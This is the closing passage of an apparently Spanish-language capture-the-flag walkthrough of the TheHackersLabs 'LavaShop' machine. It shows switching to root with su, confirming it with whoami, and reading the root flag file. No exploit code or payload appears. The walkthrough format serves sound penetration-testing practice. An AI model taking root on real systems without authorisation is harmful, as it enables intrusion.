Probémosla:
```bash
Rodri@Thehackerslabs-LavaShop:/$ su
Contraseña: 
root@Thehackerslabs-LavaShop:/# whoami
root
```
Ya somos **Root**.

Obtengamos la última flag:
```bash
root@Thehackerslabs-LavaShop:/# cd /root
root@Thehackerslabs-LavaShop:~# ls
root.txt
root@Thehackerslabs-LavaShop:~# cat root.txt
...
```
Y con esto, terminamos la máquina.
